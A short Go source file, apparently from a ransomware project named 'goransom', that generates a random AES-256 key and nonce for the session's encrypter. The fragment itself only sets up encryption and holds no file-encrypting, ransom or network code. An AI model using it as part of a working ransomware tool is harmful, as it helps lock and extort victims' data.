package main

import (
	"goransom/aes"
	"log"
)

var encrypter aes.Encrypter

const AESKeySize = 32

// initAESEncrypter initializes the encrypter for the current session.
func initAESEncrypter() {
	keySize := aes.KeySize(AESKeySize)
	key, err := aes.GenerateAESKey(keySize)
	if err != nil {
		log.Fatalln("unable to generate aes secret key: ", err)
	}

	nonce, err := aes.GenerateNonce()
	if err != nil {
		log.Fatalln("unable to generate aes nonce: ", err)
	}

	encrypter = aes.Encrypter{
		Key:   key,
		Nonce: nonce,
	}
}
